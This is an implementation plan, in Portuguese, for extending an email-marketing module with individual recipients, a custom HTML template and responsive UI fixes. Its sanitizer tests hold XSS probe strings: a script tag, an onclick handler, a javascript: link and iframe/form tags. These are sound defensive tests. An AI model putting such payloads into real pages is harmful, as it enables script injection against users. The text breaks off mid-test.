# E-mail Marketing v2 — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Acrescentar ao módulo de E-mail Marketing (já em produção) o envio para uma pessoa só, o uso de um arquivo `.html` como template, e corrigir a responsividade migrando o wizard para o design system do painel.

**Architecture:** O wizard é portado para o `ResponsiveModal` de `components/somma/` **antes** de qualquer feature nova — ele reescreve a casca do fluxo de 4 passos, então fazer depois causaria retrabalho. Destinatários individuais entram na mesma estrutura de audiência que as bases, herdando dedup, supressão, reserva atômica e rastreamento sem código novo. O HTML enviado é sanitizado no servidor com lista branca, e o rodapé de descadastro é injetado por cima — nunca opcional.

**Tech Stack:** Next.js 15.5.10 (App Router), React 19.2.0, TypeScript, Tailwind v3, zod 3.25.76, `components/somma/*` (design system), `sanitize-html` (a instalar), jest + jsdom + @testing-library/react.

## Global Constraints

- Spec de referência: `docs/superpowers/specs/2026-08-09-email-marketing-v2-design.md`. Em caso de conflito, a spec vence.
- **A ordem das tasks é deliberada.** Tasks 1–4 reestruturam; 5–7 constroem o envio individual; 8–10 constroem o template HTML. Não antecipe features para dentro do porte.
- **Supressão global continua obrigatória em todo caminho de envio**, inclusive para destinatários individuais. Nenhum caminho novo pode contornar `filterSuppressed`/`isSuppressed`.
- **O rodapé de descadastro é injetado em TODO e-mail, inclusive no HTML próprio.** Não é opcional nem removível pelo usuário — é exigência de LGPD e o domínio de envio é compartilhado com o `1-ano-SommaDay`.
- E-mails sempre normalizados por `normalizeEmail` antes de dedup, supressão e gravação.
- Client Supabase com **service role** criado localmente em cada módulo server-side. Nunca importar de `lib/supabase-client.ts` (chave anon).
- zod **3** — usar `.refine()` / `.superRefine()`, nunca sintaxe do zod 4.
- Rotas dinâmicas Next 15: `{ params }: { params: Promise<{ id: string }> }` com `await params`.
- Toda API responde erro como `{ error: string }` em português, com log prefixado `[email-campaigns/<rota>]` ou `[email-audiences/<rota>]`.
- Usar o design system (`@/components/somma`) em vez de markup artesanal: `ResponsiveModal`, `confirmAction`, `notify`, `EmptyState`, `Panel`.
- Commits em português, prefixo `feat:` / `test:` / `chore:` / `fix:` / `refactor:`.
- Rodar testes com `npm test`. Baseline neste worktree: **297 testes / 25 suítes**.
- **Nunca** forjar sessão/cookie/token nem contornar autenticação com segredos do `.env.local`. Se precisar de sessão autenticada, não faça o teste e documente.
- **Não** aplicar SQL em produção — este plano não exige migração nenhuma.

---

## File Structure

**Criar:**

| Arquivo | Responsabilidade |
|---|---|
| `lib/api/member-search.ts` | Filtro de busca acento-insensível, extraído de `app/api/membros/route.ts` |
| `lib/api/__tests__/member-search.test.ts` | Testes do filtro |
| `app/api/email-audiences/pessoas/route.ts` | Busca de pessoas com permissão `email`, devolve só nome+e-mail |
| `lib/email/html-custom.ts` | Sanitização e injeções do HTML próprio |
| `lib/email/__tests__/html-custom.test.ts` | Testes de sanitização e injeção |
| `components/email-individual-picker.tsx` | Busca e fichas de destinatários individuais |
| `components/__tests__/email-individual-picker.test.tsx` | Testes do componente |

**Modificar:**

| Arquivo | Mudança |
|---|---|
| `components/email-campaign-modal.tsx` | Porte para `ResponsiveModal`; `confirmAction`; onboarding; individuais; html |
| `components/email-content-form.tsx` | Grids responsivos; duas colunas em `lg`; campo de upload |
| `components/email-audience-picker.tsx` | Encaixe do `EmailIndividualPicker` |
| `app/email-marketing/page.tsx` | `confirmAction` no lugar dos modais artesanais |
| `app/api/membros/route.ts` | Passa a importar o filtro extraído |
| `lib/email/types.ts` | `AudienceSelection.individuais` |
| `lib/email/validation.ts` | Audiência com individuais; `content` condicional ao template |
| `lib/email/audiences.ts` | `resolveAudience` acrescenta individuais |
| `lib/email/templates/index.ts` | `TEMPLATE_KEYS` ganha `html_custom`; roteia para o renderizador novo |
| `package.json` | Dependência `sanitize-html` |

---

## Task 1: Porte do wizard para `ResponsiveModal`

**Files:**
- Modify: `components/email-campaign-modal.tsx`

**Interfaces:**
- Consumes: `ResponsiveModal` de `@/components/somma` — props `{ open, onOpenChange, title, description?, children, footer?, size?: 'sm'|'md'|'lg'|'xl', dismissible?, className? }`.
- Produces: nada novo; comportamento idêntico ao atual.

**Este é um porte puro: nenhuma mudança de comportamento.** Se algo funcionava antes e não funciona depois, é regressão. As features novas vêm nas tasks seguintes.

- [ ] **Step 1: Ler o alvo e a referência**

Leia inteiros, antes de editar:
- `components/email-campaign-modal.tsx` (o arquivo a portar)
- `components/somma/responsive-modal.tsx` (o contrato)
- `components/popups-modal.tsx` (um porte já feito, para copiar o estilo de uso)

- [ ] **Step 2: Substituir a casca do modal**

Hoje o componente renderiza um overlay artesanal:

```tsx
<div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/70 p-4">
  <div className="bg-neutral-950 border border-neutral-800 rounded-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto">
    {/* header sticky + stepper + corpo + rodapé */}
  </div>
</div>
```

Troque por `ResponsiveModal`, movendo cada parte para o slot correto:

```tsx
<ResponsiveModal
  open
  onOpenChange={(next) => { if (!next) onClose() }}
  size="xl"
  dismissible={false}
  title={editingCampaign ? 'Editar campanha' : 'Nova campanha'}
  description={<Stepper step={step} />}
  footer={<WizardFooter /* botões Voltar/Próximo/Disparar */ />}
>
  {/* só o corpo do passo atual */}
</ResponsiveModal>
```

Pontos de atenção:
- `dismissible={false}` porque é um formulário com alterações não salvas — clicar fora não deve descartar.
- O rodapé **sai** do fluxo rolável e vira o slot `footer`. É a correção central desta task.
- Remova `max-h-[90vh]`, `overflow-y-auto` e o `sticky top-0` do header — o `ResponsiveModal` já cuida disso, e mantê-los cria scroll aninhado.

- [ ] **Step 3: Extrair o stepper para um subcomponente local**

Ainda no mesmo arquivo, extraia o stepper para uma função local `Stepper({ step }: { step: number })`. Ele passa a viver no slot `description`.

Troque `hidden sm:inline` nos labels por algo que preserve o contexto em telas pequenas: mostre o label **apenas do passo atual** em mobile e todos em `sm+`. Exemplo de abordagem — para cada passo, `className={i === step ? 'inline' : 'hidden sm:inline'}` no label.

- [ ] **Step 4: Extrair o rodapé para um subcomponente local**

Extraia os botões de navegação para `WizardFooter`, também local ao arquivo. Ele recebe o que precisa por props (step, gates de habilitação, handlers) e vai no slot `footer`.

Em mobile o `ResponsiveModal` aplica `[&>button]:w-full` no rodapé, então botões soltos ocupam a largura toda. Se você agrupar em um `<div className="flex gap-3">`, esse seletor não alcança — nesse caso aplique você mesmo `w-full sm:w-auto` nos botões, como `popups-modal.tsx` faz.

- [ ] **Step 5: Verificar que compila e nada regrediu**

Run: `npx tsc --noEmit`
Expected: nenhum erro novo em `components/email-campaign-modal.tsx`.

Run: `npm test`
Expected: 297 testes passando, nenhuma regressão.

Run: `npx next build`
Expected: compila.

- [ ] **Step 6: Commit**

```bash
git add components/email-campaign-modal.tsx
git commit -m "refactor(email): porta o wizard para o ResponsiveModal do design system"
```

---

## Task 2: Responsividade dos formulários e uso da tela

**Files:**
- Modify: `components/email-content-form.tsx`

**Interfaces:**
- Consumes: a estrutura de modal da Task 1.
- Produces: nada novo.

- [ ] **Step 1: Corrigir os dois grids que apertam**

Em `components/email-content-form.tsx` há dois `grid grid-cols-2 gap-3` sem breakpoint — um para Data/Local (template `evento`) e outro para rótulo e URL do CTA. Localize por conteúdo, não por número de linha.

Troque ambos por `grid grid-cols-1 gap-3 sm:grid-cols-2`. Abaixo de 640px eles empilham; acima, ficam lado a lado como hoje.

- [ ] **Step 2: Tornar o preview proporcional ao viewport**

O `iframe` do preview usa `h-96` (384px fixos). Troque por uma altura que responda à tela: `h-[50vh] min-h-[16rem] lg:h-full lg:min-h-[24rem]`.

O placeholder que aparece antes de existir preview (hoje `h-32`) deve acompanhar: `h-[50vh] min-h-[16rem] lg:h-full lg:min-h-[24rem]`, para o layout não pular quando o preview carrega.

- [ ] **Step 3: Layout de duas colunas a partir de `lg`**

Envolva o formulário e o preview num grid:

```tsx
<div className="grid grid-cols-1 gap-5 lg:grid-cols-2 lg:items-start">
  <div className="space-y-4">{/* campos do formulário */}</div>
  <div className="lg:sticky lg:top-0">{/* preview */}</div>
</div>
```

Abaixo de `lg` empilham na ordem atual (formulário, depois preview). A partir de `lg` ficam lado a lado, e o preview acompanha a rolagem do formulário.

- [ ] **Step 4: Verificar**

Run: `npx tsc --noEmit` — sem erro novo.
Run: `npm test` — sem regressão.
Run: `npx next build` — compila.

- [ ] **Step 5: Commit**

```bash
git add components/email-content-form.tsx
git commit -m "fix(email): formulário responsivo e preview lado a lado no desktop"
```

---

## Task 3: `confirmAction` no lugar dos diálogos artesanais

**Files:**
- Modify: `components/email-campaign-modal.tsx`
- Modify: `app/email-marketing/page.tsx`

**Interfaces:**
- Consumes: `confirmAction(options): Promise<boolean>` de `@/components/somma`, com `options: { title, description?, confirmLabel?, cancelLabel?, tone?: 'danger'|'default', detail? }`.

- [ ] **Step 1: Substituir os `confirm()` nativos do wizard**

Em `components/email-campaign-modal.tsx` há duas chamadas a `confirm()` — uma antes de disparar, outra antes de agendar. Troque pela versão do design system. Exemplo para o disparo:

```tsx
const ok = await confirmAction({
  title: 'Disparar agora?',
  description: `A campanha será enviada para ${audienceTotal} ${audienceTotal === 1 ? 'destinatário' : 'destinatários'}. Quem já receber não pode ser desfeito.`,
  confirmLabel: 'Disparar',
  tone: 'danger',
})
if (!ok) return
```

Mantenha o texto do agendamento coerente com o que ele faz de fato.

- [ ] **Step 2: Substituir os dois modais de confirmação artesanais da página**

`app/email-marketing/page.tsx` tem dois modais construídos à mão (exclusão e cancelamento), controlados por estado (`deleteConfirm`, `cancelConfirm`). Substitua por `confirmAction`, e **remova os estados e o JSX** que existiam só para eles.

Exemplo do fluxo de exclusão:

```tsx
async function handleDelete(campaign: EmailCampaign) {
  const ok = await confirmAction({
    title: 'Excluir campanha?',
    description: 'A campanha e o histórico de destinatários são apagados. Não dá para desfazer.',
    detail: campaign.nome,
    confirmLabel: 'Excluir',
    tone: 'danger',
  })
  if (!ok) return
  // ... a chamada DELETE que já existe, preservando o tratamento de erro 409
}
```

Preserve o tratamento de erro que já existe — em especial o caso de o servidor recusar com 409 (campanha em envio), que hoje reverte o estado da lista.

- [ ] **Step 3: Verificar**

Run: `npx tsc --noEmit` — sem erro novo.
Run: `npm test` — sem regressão.

- [ ] **Step 4: Commit**

```bash
git add components/email-campaign-modal.tsx app/email-marketing/page.tsx
git commit -m "refactor(email): usa confirmAction do design system nas ações destrutivas"
```

---

## Task 4: Onboarding — orientação por passo

**Files:**
- Modify: `components/email-campaign-modal.tsx`

**Interfaces:**
- Consumes: a estrutura da Task 1.

- [ ] **Step 1: Adicionar o texto de orientação de cada passo**

Ainda em `components/email-campaign-modal.tsx`, defina um mapa de orientações:

```tsx
const STEP_HINTS: Record<number, string> = {
  1: 'Escolha de onde vêm os destinatários. A contagem já desconta quem aparece em mais de uma base e quem se descadastrou.',
  2: 'Escreva o e-mail. Use {{nome}} onde quiser o nome de cada destinatário — quem não tiver nome cadastrado recebe o texto sem ele.',
  3: 'Confira o resumo e mande um teste para você antes de disparar. O teste não conta nas métricas da campanha.',
  4: 'Disparar é irreversível para quem já recebeu. Agendar permite cancelar até a hora marcada.',
}
```

Renderize a orientação do passo atual no topo do corpo do modal, num bloco discreto — texto pequeno, cor `text-neutral-400`, com um ícone de informação do `lucide-react`. Sempre visível, sem estado, sem botão de fechar.

- [ ] **Step 2: Verificar**

Run: `npx tsc --noEmit` — sem erro novo.
Run: `npm test` — sem regressão.

- [ ] **Step 3: Commit**

```bash
git add components/email-campaign-modal.tsx
git commit -m "feat(email): orientação contextual em cada passo do wizard"
```

---

## Task 5: Busca de pessoas com permissão própria

**Files:**
- Create: `lib/api/member-search.ts`
- Create: `lib/api/__tests__/member-search.test.ts`
- Create: `app/api/email-audiences/pessoas/route.ts`
- Modify: `app/api/membros/route.ts`

**Interfaces:**
- Produces:
  - `toAccentInsensitiveRegex(term: string): string`
  - `applyMemberSearch<T extends { or: (filter: string) => T }>(query: T, term: string): T`
  - `GET /api/email-audiences/pessoas?q=<termo>` → `{ data: Array<{ nome: string | null; email: string }> }`

- [ ] **Step 1: Ler a busca existente antes de extrair**

Leia `app/api/membros/route.ts` inteiro. A função `applySearch` (por volta da linha 33) e a helper de regex acento-insensível são o que será extraído. Entenda o comentário que as acompanha: não há extensão `unaccent` no banco, por isso a busca monta um regex com classes de caractere por letra acentuada e usa `imatch` (`~*`).

- [ ] **Step 2: Escrever o teste que falha**

Criar `lib/api/__tests__/member-search.test.ts`. O teste cobre a parte pura — a construção do regex e a montagem do filtro:

```ts
import { toAccentInsensitiveRegex, applyMemberSearch } from '../member-search'

/** Espião mínimo com a forma que o PostgREST expõe: `.or()` encadeável. */
function fakeQuery() {
  const calls: string[] = []
  const q = { or: (f: string) => { calls.push(f); return q } }
  return { q, calls }
}

describe('toAccentInsensitiveRegex', () => {
  it('expande vogais acentuadas em classes de caractere', () => {
    const re = toAccentInsensitiveRegex('joao')
    expect(re).toContain('[aáàâã]')
    expect(re).toContain('[oóòôõ]')
  })

  it('trata a letra c como classe com cedilha', () => {
    expect(toAccentInsensitiveRegex('caca')).toContain('[cç]')
  })

  it('escapa caracteres especiais de regex', () => {
    const re = toAccentInsensitiveRegex('a.b*c')
    expect(re).toContain('\\.')
    expect(re).toContain('\\*')
  })

  it('devolve string vazia para entrada vazia', () => {
    expect(toAccentInsensitiveRegex('')).toBe('')
    expect(toAccentInsensitiveRegex('   ')).toBe('')
  })
})

describe('applyMemberSearch', () => {
  it('gera um filtro por termo (AND entre termos)', () => {
    const { q, calls } = fakeQuery()
    applyMemberSearch(q, 'maria silva')
    expect(calls).toHaveLength(2)
  })

  it('cada filtro cobre nome e e-mail', () => {
    const { q, calls } = fakeQuery()
    applyMemberSearch(q, 'maria')
    expect(calls[0]).toContain('nome_completo')
    expect(calls[0]).toContain('email')
  })

  it('busca por dígitos quando o termo tem 3 ou mais números', () => {
    const { q, calls } = fakeQuery()
    applyMemberSearch(q, '61999')
    expect(calls[0]).toMatch(/cpf|whatsapp/)
  })

  it('não gera filtro para termo vazio', () => {
    const { q, calls } = fakeQuery()
    applyMemberSearch(q, '   ')
    expect(calls).toHaveLength(0)
  })

  it('devolve a própria query, para permitir encadeamento', () => {
    const { q } = fakeQuery()
    expect(applyMemberSearch(q, 'ana')).toBe(q)
  })
})
```

- [ ] **Step 3: Rodar e confirmar que falha**

Run: `npm test -- lib/api/__tests__/member-search.test.ts`
Expected: FAIL — `Cannot find module '../member-search'`

- [ ] **Step 4: Extrair o módulo**

Criar `lib/api/member-search.ts` movendo a lógica de `app/api/membros/route.ts` **sem alterar o comportamento**. Preserve os comentários que explicam o porquê do regex — eles são a memória de uma decisão não óbvia.

Exporte `toAccentInsensitiveRegex` e `applyMemberSearch` (o nome novo de `applySearch`).

- [ ] **Step 5: Fazer a rota existente importar o módulo**

Em `app/api/membros/route.ts`, remova a definição local e importe de `@/lib/api/member-search`. Nenhuma mudança de comportamento — a mesma função, agora compartilhada.

- [ ] **Step 6: Rodar e confirmar que passa**

Run: `npm test -- lib/api/__tests__/member-search.test.ts`
Expected: PASS

Run: `npm test`
Expected: sem regressão nos testes que já existiam.

- [ ] **Step 7: Criar a rota de busca do módulo de e-mail**

Criar `app/api/email-audiences/pessoas/route.ts`:

```ts
import { createClient } from '@supabase/supabase-js'
import { NextRequest, NextResponse } from 'next/server'
import { requirePermission } from '@/lib/auth/api-auth'
import { applyMemberSearch } from '@/lib/api/member-search'

// Service role — NÃO importar de lib/supabase-client.ts (chave anon).
function getSupabase() {
  return createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!,
    { auth: { autoRefreshToken: false, persistSession: false } },
  )
}

/** Teto de sugestões — é um autocomplete, não uma listagem. */
const LIMIT = 10

/**
 * Busca pessoas para o envio individual.
 *
 * Rota própria em vez de reusar `/api/membros` porque aquela exige a permissão
 * `membros`, que dá acesso a CPF, telefone e edição de cadastro. Quem opera
 * e-mail marketing precisa só de nome e e-mail — e é só isso que sai daqui.
 */
export async function GET(req: NextRequest) {
  const auth = await requirePermission(req, 'email')
  if (auth instanceof NextResponse) return auth

  const term = (req.nextUrl.searchParams.get('q') ?? '').trim()
  if (term.length < 2) return NextResponse.json({ data: [] })

  try {
    const supabase = getSupabase()
    let query = supabase
      .from('cadastro_site')
      .select('nome_completo, email')
      .not('email', 'is', null)
      .limit(LIMIT)

    query = applyMemberSearch(query, term)

    const { data, error } = await query
    if (error) {
      console.error('[email-audiences/pessoas] GET error:', error)
      return NextResponse.json({ error: 'Erro ao buscar pessoas' }, { status: 500 })
    }

    return NextResponse.json({
      data: (data ?? []).map((r) => ({ nome: r.nome_completo ?? null, email: r.email })),
    })
  } catch (err) {
    console.error('[email-audiences/pessoas] GET exception:', err)
    return NextResponse.json({ error: 'Erro ao buscar pessoas' }, { status: 500 })
  }
}
```

A rota já é coberta pelo padrão `/^\/api\/email-/` em `lib/auth/route-permissions.ts`, então o middleware exige a permissão `email` além do guard explícito.

- [ ] **Step 8: Verificar o guard**

Run: `npm run dev` e, em outro terminal:

```bash
curl -s -o /dev/null -w "%{http_code}\n" "http://localhost:3000/api/email-audiences/pessoas?q=ana"
```

Expected: `401` — sem sessão, rejeita.

- [ ] **Step 9: Commit**

```bash
git add lib/api/member-search.ts lib/api/__tests__/member-search.test.ts app/api/email-audiences/pessoas/route.ts app/api/membros/route.ts
git commit -m "feat(email): busca de pessoas com permissão própria, reusando o filtro de membros"
```

---

## Task 6: Destinatários individuais no modelo de audiência

**Files:**
- Modify: `lib/email/types.ts`
- Modify: `lib/email/validation.ts`
- Modify: `lib/email/audiences.ts`
- Test: `lib/email/__tests__/audiences.test.ts` (acrescentar)

**Interfaces:**
- Consumes: `dedupeRecipients`, `Recipient`, `normalizeEmail` de `lib/email/normalize.ts`.
- Produces:
  - `AudienceSelection` passa a ser `{ bases: Array<{key, filtros}>; individuais?: Array<{ email: string; nome: string | null }> }`
  - `resolveAudience` inalterada na assinatura, mas passa a incluir os individuais.

- [ ] **Step 1: Escrever os testes que falham**

Acrescente a `lib/email/__tests__/audiences.test.ts` um bloco novo. Estes testes cobrem a parte pura — a montagem da lista de individuais, sem tocar o Supabase:

```ts
import { individuaisToRecipients } from '../audiences'

describe('individuaisToRecipients', () => {
  it('converte para destinatários com a base de origem "individual"', () => {
    const out = individuaisToRecipients([{ email: 'a@x.com', nome: 'Ana' }])
    expect(out).toEqual([{ email: 'a@x.com', nome: 'Ana', sourceBase: 'individual' }])
  })

  it('normaliza o e-mail', () => {
    const out = individuaisToRecipients([{ email: '  A@X.COM ', nome: null }])
    expect(out[0].email).toBe('a@x.com')
  })

  it('descarta e-mail inválido', () => {
    const out = individuaisToRecipients([
      { email: 'sem-arroba', nome: null },
      { email: 'ok@x.com', nome: null },
    ])
    expect(out.map((r) => r.email)).toEqual(['ok@x.com'])
  })

  it('preserva nome nulo', () => {
    const out = individuaisToRecipients([{ email: 'a@x.com', nome: null }])
    expect(out[0].nome).toBeNull()
  })

  it('devolve vazio para entrada vazia ou ausente', () => {
    expect(individuaisToRecipients([])).toEqual([])
    expect(individuaisToRecipients(undefined)).toEqual([])
  })
})
```

- [ ] **Step 2: Rodar e confirmar que falha**

Run: `npm test -- lib/email/__tests__/audiences.test.ts`
Expected: FAIL — `individuaisToRecipients` não existe.

- [ ] **Step 3: Estender o tipo**

Em `lib/email/types.ts`, a interface de seleção de audiência passa a aceitar individuais:

```ts
export interface AudienceIndividual {
  email: string
  nome: string | null
}

export interface AudienceSelection {
  bases: Array<{ key: AudienceKey; filtros: Record<string, string> }>
  /** Destinatários avulsos, buscados na base de membros ou digitados. */
  individuais?: AudienceIndividual[]
}
```

- [ ] **Step 4: Implementar a conversão e incluir na resolução**

Em `lib/email/audiences.ts`, exporte a função pura e use-a em `resolveAudience`:

```ts
/** Converte destinatários avulsos em `Recipient`, descartando e-mail inválido. */
export function individuaisToRecipients(
  individuais: AudienceIndividual[] | undefined,
): Recipient[] {
  if (!individuais?.length) return []
  const out: Recipient[] = []
  for (const item of individuais) {
    const email = normalizeEmail(item.email)
    if (!email) continue
    out.push({ email, nome: item.nome ?? null, sourceBase: 'individual' })
  }
  return out
}
```

Em `resolveAudience`, acrescente os individuais como mais uma lista **antes** do dedup, de modo que passem pelo mesmo caminho de deduplicação e supressão das bases:

```ts
const lists: Recipient[][] = []
for (const base of bases) {
  // ... o fetch por base que já existe
}
lists.push(individuaisToRecipients(selection.individuais))

// `null` de filterSuppressed significa lista indisponível — já tratado.
return filterSuppressed(dedupeRecipients(lists))
```

> Ordem importa: as bases entram primeiro, então uma pessoa que também esteja numa base preserva a `sourceBase` da base. É o comportamento desejado — a atribuição por origem continua fiel.

- [ ] **Step 5: Ajustar a validação**

Em `lib/email/validation.ts`, o schema de audiência hoje exige `bases.min(1)`. Passa a exigir pelo menos um dos dois lados preenchido:

```ts
const individualSchema = z.object({
  email: z.string().email('E-mail inválido'),
  nome: z.string().max(120).nullable().default(null),
})

export const audienceSchema = z
  .object({
    bases: z
      .array(
        z.object({
          key: z.string().refine(isAudienceKey, { message: 'Base desconhecida' }),
          filtros: z.record(z.string()).default({}),
        }),
      )
      .default([]),
    individuais: z.array(individualSchema).max(50, 'No máximo 50 destinatários individuais').default([]),
  })
  .refine(
    (a) => a.bases.length > 0 || a.individuais.length > 0,
    { message: 'Selecione ao menos uma base ou um destinatário' },
  )
```

> O teto de 50 é deliberado: acima disso o caminho correto é uma base com filtro, não uma lista colada à mão.

- [ ] **Step 6: Rodar e confirmar que passa**

Run: `npm test -- lib/email/__tests__/audiences.test.ts`
Expected: PASS

Run: `npm test`
Expected: sem regressão. Se algum teste existente construía `audience` só com `bases`, ele continua válido — `individuais` tem `default([])`.

Run: `npx tsc --noEmit` — sem erro novo.

- [ ] **Step 7: Commit**

```bash
git add lib/email/types.ts lib/email/validation.ts lib/email/audiences.ts lib/email/__tests__/audiences.test.ts
git commit -m "feat(email): destinatários individuais na estrutura de audiência"
```

---

## Task 7: Interface do envio individual

**Files:**
- Create: `components/email-individual-picker.tsx`
- Create: `components/__tests__/email-individual-picker.test.tsx`
- Modify: `components/email-audience-picker.tsx`

**Interfaces:**
- Consumes: `GET /api/email-audiences/pessoas?q=` (Task 5); `AudienceIndividual` (Task 6).
- Produces: componente `<EmailIndividualPicker value={...} onChange={...} />` com
  `value: AudienceIndividual[]` e `onChange(next: AudienceIndividual[]): void`.

- [ ] **Step 1: Escrever os testes que falham**

Criar `components/__tests__/email-individual-picker.test.tsx`, seguindo o padrão de `components/__tests__/email-audience-picker.test.tsx` (leia-o primeiro — ele mostra como o projeto mocka `apiFetch` e usa fake timers para debounce):

```tsx
import { render, screen, fireEvent, act } from '@testing-library/react'
import { EmailIndividualPicker } from '../email-individual-picker'

jest.mock('@/lib/api-client', () => ({
  apiFetch: jest.fn(),
}))
const { apiFetch } = jest.requireMock('@/lib/api-client')

function respondWith(data: Array<{ nome: string | null; email: string }>) {
  ;(apiFetch as jest.Mock).mockResolvedValue({
    ok: true,
    json: async () => ({ data }),
  })
}

beforeEach(() => {
  jest.useFakeTimers()
  ;(apiFetch as jest.Mock).mockReset()
})
afterEach(() => jest.useRealTimers())

describe('EmailIndividualPicker', () => {
  it('mostra os escolhidos como fichas', () => {
    render(
      <EmailIndividualPicker
        value={[{ email: 'ana@x.com', nome: 'Ana' }]}
        onChange={() => {}}
      />,
    )
    expect(screen.getByText(/ana@x\.com/)).toBeInTheDocument()
  })

  it('remove um escolhido ao clicar no botão de remover', () => {
    const onChange = jest.fn()
    render(
      <EmailIndividualPicker
        value={[{ email: 'ana@x.com', nome: 'Ana' }]}
        onChange={onChange}
      />,
    )
    fireEvent.click(screen.getByRole('button', { name: /remover/i }))
    expect(onChange).toHaveBeenCalledWith([])
  })

  it('busca depois do debounce e lista sugestões', async () => {
    respondWith([{ nome: 'Ana Souza', email: 'ana@x.com' }])
    render(<EmailIndividualPicker value={[]} onChange={() => {}} />)

    fireEvent.change(screen.getByRole('textbox'), { target: { value: 'ana' } })
    await act(async () => {
      jest.advanceTimersByTime(500)
    })

    expect(await screen.findByText('Ana Souza')).toBeInTheDocument()
  })

  it('não busca com menos de 2 caracteres', async () => {
    render(<EmailIndividualPicker value={[]} onChange={() => {}} />)
    fireEvent.change(screen.getByRole('textbox'), { target: { value: 'a' } })
    await act(async () => {
      jest.advanceTimersByTime(500)
    })
    expect(apiFetch).not.toHaveBeenCalled()
  })

  it('oferece adicionar um e-mail digitado que não está na base', async () => {
    respondWith([])
    render(<EmailIndividualPicker value={[]} onChange={() => {}} />)

    fireEvent.change(screen.getByRole('textbox'), {
      target: { value: 'novo@exemplo.com' },
    })
    await act(async () => {
      jest.advanceTimersByTime(500)
    })

    expect(await screen.findByText(/novo@exemplo\.com/)).toBeInTheDocument()
  })

  it('não duplica quem já foi escolhido', async () => {
    respondWith([{ nome: 'Ana', email: 'ana@x.com' }])
    const onChange = jest.fn()
    render(
      <EmailIndividualPicker
        value={[{ email: 'ana@x.com', nome: 'Ana' }]}
        onChange={onChange}
      />,
    )
    fireEvent.change(screen.getByRole('textbox'), { target: { value: 'ana' } })
    await act(async () => {
      jest.advanceTimersByTime(500)
    })
    const sugestao = screen.queryByRole('button', { name: /Ana Souza/i })
    expect(sugestao).toBeNull()
  })
})
```

- [ ] **Step 2: Rodar e confirmar que falha**

Run: `npm test -- components/__tests__/email-individual-picker.test.tsx`
Expected: FAIL — módulo não existe.

- [ ] **Step 3: Implementar o componente**

Criar `components/email-individual-picker.tsx`, um client component com:

- Campo de texto controlado, `role="textbox"` natural de um `<input type="text">`.
- Debounce de 500 ms antes de chamar `apiFetch('/api/email-audiences/pessoas?q=...')`. **Use o mesmo guard de resposta obsoleta de `email-audience-picker.tsx`** (contador de requisição em `useRef`, aplicando a resposta só se ainda for a mais recente) — sem isso, uma resposta lenta sobrescreve uma rápida.
- Busca só a partir de 2 caracteres.
- Sugestões: lista clicável com nome e e-mail. Já escolhidos não aparecem.
- Se o texto digitado for um e-mail válido e não estiver nas sugestões nem nos escolhidos, oferecer "Adicionar `<email>`" como primeira opção.
- Escolhidos: fichas com nome (ou o e-mail, se não houver nome) e um botão de remover com `aria-label` contendo "Remover".
- Estética do módulo: `bg-neutral-900`, `border-neutral-800`, texto `text-neutral-400`, accent `orange-500`.

- [ ] **Step 4: Rodar e confirmar que passa**

Run: `npm test -- components/__tests__/email-individual-picker.test.tsx`
Expected: PASS

- [ ] **Step 5: Encaixar no seletor de audiência**

Em `components/email-audience-picker.tsx`, abaixo dos cards de base, acrescente uma seção "Ou envie para pessoas específicas" com o `EmailIndividualPicker`.

O componente pai já mantém `value: AudienceSelection`; passe `value.individuais ?? []` e, no `onChange`, componha `{ ...value, individuais: next }`.

A contagem ao vivo já reflete tudo automaticamente: ela chama `POST /api/email-audiences/preview` com a seleção inteira, e `resolveAudience` (Task 6) agora inclui os individuais. **Confirme que o efeito de debounce da contagem depende da seleção inteira** (hoje ele observa `JSON.stringify(value)`), para que marcar uma pessoa recalcule o total.

- [ ] **Step 6: Verificar**

Run: `npm test` — sem regressão.
Run: `npx tsc --noEmit` — sem erro novo.
Run: `npx next build` — compila.

- [ ] **Step 7: Commit**

```bash
git add components/email-individual-picker.tsx components/__tests__/email-individual-picker.test.tsx components/email-audience-picker.tsx
git commit -m "feat(email): busca e seleção de destinatários individuais"
```

---

## Task 8: Sanitização e injeções do HTML próprio

**Files:**
- Create: `lib/email/html-custom.ts`
- Create: `lib/email/__tests__/html-custom.test.ts`
- Modify: `package.json` (dependência `sanitize-html`)

**Interfaces:**
- Produces:
  - `sanitizeCampaignHtml(raw: string): string`
  - `renderHtmlCustom(args: { html: string; nome: string | null; preheader?: string | null; unsubscribeUrl: string }): string`

- [ ] **Step 1: Instalar a dependência**

Run: `npm install sanitize-html && npm install --save-dev @types/sanitize-html`

- [ ] **Step 2: Escrever os testes que falham**

Criar `lib/email/__tests__/html-custom.test.ts`:

```ts
import { sanitizeCampaignHtml, renderHtmlCustom } from '../html-custom'

const UNSUB = 'https://admin.sommaclub.com.br/api/unsubscribe?t=abc'

describe('sanitizeCampaignHtml', () => {
  it('remove script', () => {
    const out = sanitizeCampaignHtml('<p>ok</p><script>alert(1)</script>')
    expect(out).toContain('ok')
    expect(out).not.toContain('alert(1)')
    expect(out.toLowerCase()).not.toContain('<script')
  })

  it('remove iframe, form, object e embed', () => {
    const out = sanitizeCampaignHtml(
      '<iframe src="x"></iframe><form></form><object></object><embed />',
    )
    expect(out.toLowerCase()).not.toContain('<iframe')
    expect(out.toLowerCase()).not.toContain('<form')
    expect(out.toLowerCase()).not.toContain('<object')
    expect(out.toLowerCase()).not.toContain('<embed')
  })

  it('remove atributos de evento', () => {
    const out = sanitizeCampaignHtml('<p onclick="alert(1)">oi</p>')
    expect(out).not.toContain('onclick')
  })

  it('remove href com esquema javascript', () => {
    const out = sanitizeCampaignHtml('<a href="javascript:alert(1)">x</a>')
    expect(out).not.toContain('javascript:')
  })

  it('preserva href http e https', () => {
    const out = sanitizeCampaignHtml('<a href="https://ok.com">x</a>')
    expect(out).toContain('https://ok.com')
  })

  it('preserva a formatação típica de e-mail', () => {
    const raw =
      '<table role="presentation"><tr><td style="color:#fff">oi</td></tr></table><img src="https://x/y.png" />'
    const out = sanitizeCampaignHtml(raw)
    expect(out).toContain('<table')
    expect(out).toContain('style=')
    expect(out).toContain('<img')
  })
})

describe('renderHtmlCustom', () => {
  const base = { html: '<body><p>Oi {{nome}}</p></body>', nome: 'Ana', unsubscribeUrl: UNSUB }

